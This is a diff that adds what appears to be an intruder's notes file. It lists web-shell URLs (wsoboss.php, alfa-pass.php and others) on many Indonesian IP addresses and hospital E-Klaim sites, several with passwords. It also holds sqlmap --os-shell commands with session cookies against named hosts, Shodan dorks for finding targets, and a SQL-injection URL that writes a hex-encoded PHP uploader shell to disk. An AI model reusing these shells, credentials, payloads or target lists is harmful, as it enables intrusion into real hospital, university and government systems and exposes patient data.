@@ -1,0 +1,276 @@
+view-source:http://36.66.239.162:8888/phpmyadmin/index.php
+http://36.66.239.162:8072/
+http://120.89.94.227:5555/wsoboss.php
+http://203.142.74.174:5555/wsoboss.php
+http://103.136.161.37:7777/wsoboss.php
+http://103.119.145.195:5555/wsoboss.php
+http://103.136.161.37:7777/wsoboss.php
+http://103.16.198.50:5555/wsob.php
+http://202.150.153.148:5555/wsoboss.php
+
+
+http://103.154.218.69:5555/asu1337.php
+http://103.126.172.149:5555/wsob.php
+http://203.142.74.174:5555/wsoboss.php
+http://36.66.160.38:5555/wsoboss.php
+http://103.119.145.195:5555/wsoboss.php
+
+http://103.16.198.50:5555/wsob.php  sysadmin Admin1
+http://222.124.175.99:5555/wsob.php  agung Admin12
+http://103.126.172.149:5555/wsob.php#
+http://103.154.218.69:5555/asu1337.php#
+http://103.165.156.26:5555/wsob.php#
+http://103.193.176.61:5555/admina/modul/rekapitulasi/wsob.php  Administrator Admin12
+
+
+site:http://103.109.0.178:5555/
+site:http://103.16.198.50:5555/ wilona
+site:http://222.124.175.99:5555/ w
+site:http://103.126.172.149:5555/ w
+
+site:http://103.165.156.26:5555/ W
+site:http://103.193.176.61:5555/
+site:http://36.66.160.38:5555/ W
+
+site:http://36.92.215.147:5555/
+site:http://27.123.2.178:7777/
+
+site:http://36.92.215.147:5555/
+site:http://27.123.2.178:7777/
+
+
+site:http://203.160.59.115:7777/ n
+site:http://103.154.218.69:5555/ N
+site:http://103.119.145.195:5555/ n
+
+
+bekas
+http://103.193.176.61:5555/wsob.php
+http://36.92.215.147:5555/wsoboss.php
+http://36.93.175.31:7777/wsoboss.php
+http://27.123.2.178:7777/wsoboss.php
+http://27.123.2.75:7777/wsoboss.php
+
+http://202.150.153.148:5555/alfa-pass.php
+http://203.142.74.174:5555/alfa-pass.php
+http://222.124.175.99:5555/alfa-pass.php
+http://103.126.172.149:5555/alfa-pass.php
+http://103.154.218.69:5555/alfa-pass.php
+
+bebebek
+http://210.210.128.26:5555/
+http://103.160.62.156:5555/
+http://43.247.13.12:5555/
+http://103.160.21.191:5555/
+http://119.18.158.222:5555/
+http://103.176.79.62:5555/
+http://103.229.14.83:5555/
+http://103.121.122.7:5555/
+
+
+bekas
+http://103.54.1.67:5555/
+http://202.150.153.148:5555/admina/login.php
+http://103.136.161.37:7777/wsoboss.php
+http://203.160.59.157:7777/wsoboss.php
+http://36.66.138.19:7777/wsoboss.php
+http://114.141.52.173:7777/
+http://36.64.196.210:7777/
+http://203.160.59.149:7777/
+
+nando
+http://103.144.208.2:5555/wsoboss.php
+http://103.144.209.228:5555/admina/login.php
+
+HOHO BRKAS
+http://222.124.175.99:5555/wwww.php
+http://103.16.198.50:5555/wwww.php
+
+
+http://27.123.2.178:7777/wsoboss.php
+http://203.160.59.115:7777/wsoboss.php
+http://36.93.175.31:7777/wsoboss.php
+http://103.136.161.37:7777/wsoboss.php
+http://27.123.2.75:7777/wsoboss.php
+http://203.160.59.157:7777/wsoboss.php
+http://36.66.138.19:7777/wsoboss.php
+http://114.141.52.173:7777/wsoboss.php
+http://203.160.59.149:7777/wsoboss.php
+http://183.81.158.211:7777/wsoboss.php
+
+http://36.91.133.35:7777/wsoboss.php hohokia
+http://36.64.196.210:7777/wsoboss.php hohokia
+
+python2 sqlmap.py -u "http://36.93.175.31:7777/popup/print_inc_prod.php?trf_id=452" --os-shell
+
+
+http://e-pendapatan.jayapurakab.go.id
+http://unw.ac.id:5555/
+
+182.253.114.27
+36.92.6.45
+
+
+http://210.210.128.27:5555/gecko-login.php
+http://43.225.67.222:5555/wsoboss.php
+http://103.215.177.174:5555/wsoboss.php
+http://103.215.177.174:5555/wsoboss.php
+http://160.202.42.166:5555/wsoboss.php
+http://203.142.74.174:5555/wsoboss.php
+http://103.236.192.113:5555/wsoboss.php
+http://210.210.128.27:5555/wsoboss.php
+http://103.156.216.250:5555/wsoboss.php
+http://180.250.187.124:5555/wsoboss.php
+http://182.253.114.27:5555/wsoboss.php Dom 
+http://103.16.198.50:5555/wsoboss.php
+http://103.160.62.156:5555/admina/modul/rekapitulasi/wsoboss.php
+http://222.124.175.99:5555/wsoboss.php
+http://103.126.172.149:5555/wsoboss.php
+http://103.154.218.69:5555/wsoboss.php
+http://210.210.128.26:5555/wsoboss.php
+http://36.88.249.52:5555/wsoboss.php
+http://43.247.13.12:5555/wsoboss.php
+http://119.18.158.222:5555/wsoboss.php
+http://103.15.240.145:5555/wsoboss.php
+http://103.30.182.123:5555/wsoboss.php
+http://103.30.182.123:5555/wsoboss.php
+http://103.54.1.67:5555/wsoboss.php 
+http://36.66.160.38:5555/wsoboss.php
+http://103.119.145.195:5555/wsoboss.php
+http://103.98.176.158:5555/wsoboss.php
+http://103.144.208.2:5555/wsoboss.php
+http://36.92.215.147:5555/wsoboss.php
+http://202.150.153.148:5555/wsoboss.php
+http://103.176.79.62:5555/wsoboss.php
+http://103.229.14.83:5555/wsoboss.php
+http://103.144.209.228:5555/wsoboss.php
+http://182.23.20.234:5555/wsoboss.php
+.
+http://103.121.122.7:5555/wsoboss.php hohokia
+http://120.89.94.227:5555/wsoboss.php hohokia
+http://103.193.176.61:5555/wsoboss.php hohokia
+http://103.77.206.210:5555/wsoboss.php hohokia
+http://103.105.64.117:5555/wsoboss.php hohokia
+http://103.160.21.191:5555/wsoboss.php hohokia
+http://103.109.0.178:5555/wsoboss.php hohokia
+http://103.165.156.26:5555/wsoboss.php hohokia
+http://103.180.164.80:5555/wsoboss.php hohokia
+
+
+
+C:/importer/app/
+
+python2 sqlmap.py -u "http://103.104.177.244:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+python2 sqlmap.py -u "http://103.144.209.228:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+python2 sqlmap.py -u "http://103.121.122.7:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+python2 sqlmap.py -u "http://103.229.14.83:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+
+
+not os shell 
+python2 sqlmap.py -u "http://119.18.159.202:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+http://103.165.225.237:5555/
+http://180.214.245.7:5555/
+
+http://103.118.82.92:5555/
+http://27.50.20.35:5555/
+http://103.104.177.245:5555/
+http://103.91.87.44:5555/
+http://103.161.192.56:5555/
+http://36.64.49.198:5555/
+
+
+http://103.157.26.244:5555/
+http://103.180.95.35:5555//
+
+http://103.94.123.221:5555/
+http://103.193.176.61:5555/
+http://103.105.64.117:5555/
+http://103.242.233.214:5555/
+http://103.167.112.176:5555/
+http://180.178.104.229:5555/
+
+http://180.250.193.173:5555/
+http://103.180.95.14/
+http://103.157.26.224:5555/
+http://103.180.95.20:5555/
+http://27.50.20.33:5555/
+http://36.88.163.36:5555/
+http://103.104.177.244:5555/
+http://202.9.69.117:443/
+http://103.133.160.224:443/
+
+
+
+getShodan.py [-h] -q <'string query'> -o <output file> -f
+                    ip_str/port/os/host/ [-os <offet_number>]
+                    [-l <limit_number>]
+
+python2 getShodan.py -q 'dork' -o awok.txt -f ip_str/port -l 4509
+python getShodan.py -q 'apache port:"8080" os:"Windows Server 2003" country:id' -o out.txt -f ip_str
+
+
+
+
+
+
+
+
+python2 getShodan.py -q 'http.title:"welcome to xampp" country:id' -o welcome.txt -f ip_str/port 
+
+
+
+
+/print/klaim.php?pid=-73&adm=-1%27+union+select+1,2,3,4,5,6,7,8,9,10,0x3C3F706870206563686F202755706C6F616465723C62723E273B6563686F20273C62723E273B6563686F20273C666F726D20616374696F6E3D2222206D6574686F643D22706F73742220656E63747970653D226D756C7469706172742F666F726D2D6461746122206E616D653D2275706C6F61646572222069643D2275706C6F61646572223E273B6563686F20273C696E70757420747970653D2266696C6522206E616D653D2266696C65222073697A653D223530223E3C696E707574206E616D653D225F75706C2220747970653D227375626D6974222069643D225F75706C222076616C75653D2255706C6F6164223E3C2F666F726D3E273B69662820245F504F53545B275F75706C275D203D3D202255706C6F6164222029207B69662840636F707928245F46494C45535B2766696C65275D5B27746D705F6E616D65275D2C20245F46494C45535B2766696C65275D5B276E616D65275D2929207B206563686F20273C623E55706C6F6164202121213C2F623E3C62723E3C62723E273B207D656C7365207B206563686F20273C623E55706C6F6164202121213C2F623E3C62723E3C62723E273B207D7D3F3E,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31+INTO+OUTFILE+%27C:/E-Klaim/shell.php%27--+-
+
+
+country:id http.favicon.hash:624566952
+popup/print_inc_prod.php?trf_id=452  F:\xampp\htdocs\
+
+python2 sqlmap.py -u "http://36.88.249.52:5555//admina/modul/rekapitulasi/get_akm.php" --data="jurusan=all&semester=20231" --cookie="ci_session=00eac93d1f7932437787662e7a5148d7f93ffb38; _TOKEN=938067b7561fe0283daf8b3f37b8c6b2fbc7ed651719932563; PHPSESSID=ofqjlpq565hfrvq67o13e0nhtd" --os-shell
+
+C:/importer/app/
+
+python2 sqlmap.py -u "http://27.123.2.75:7777/popup/print_inc_prod.php?trf_id=452" --os-shell
+
+
+
+https://eklaim.rsiarafah.id/E-Klaim/geck
+http://br.edelweiss.id:8060/E-klaim/gecko-login.phpo-login.php
+https://rsiamlgina.cloudns.asia/E-Klaim/alfa-pass.php
+https://rsiamprob.online/E-Klaim/alfa-pass.php
+https://inacbg.rsiamuhammadiyahmlg.com/E-Klaim/alfa-pass.php
+http://wonogiri.herminahospitals.com:8837/E-Klaim/alfa-pass.php
+http://sipenjor.ddns.net:8001/e-klaim/alfa-pass.php
+
+bekas
+http://kdr.rshermina.co.id:5916/e-klaim/gec-pass.php
+http://br.edelweiss.id:8060/E-klaim/gecko-login.php
+https://eklaim.rsudjombang.id/E-Klaim/gec-pass.php
+
+http://kdr.rshermina.co.id:5916/
+https://eklaim.rsudjombang.id/
+http://www.sungaililinhospital.my.id/
+http://br.edelweiss.id:8060/
+https://eklaim.rsiarafah.id/
+
+
+
+https://eklaim.rsiarafah.id/
+http://br.edelweiss.id:8060/
+https://rsiamlgina.cloudns.asia/
+https://rsiamprob.online
+https://inacbg.rsiamuhammadiyahmlg.com/
+http://wonogiri.herminahospitals.com:8837/
+http://sipenjor.ddns.net:8001/
+
+
+
+
+
+
+
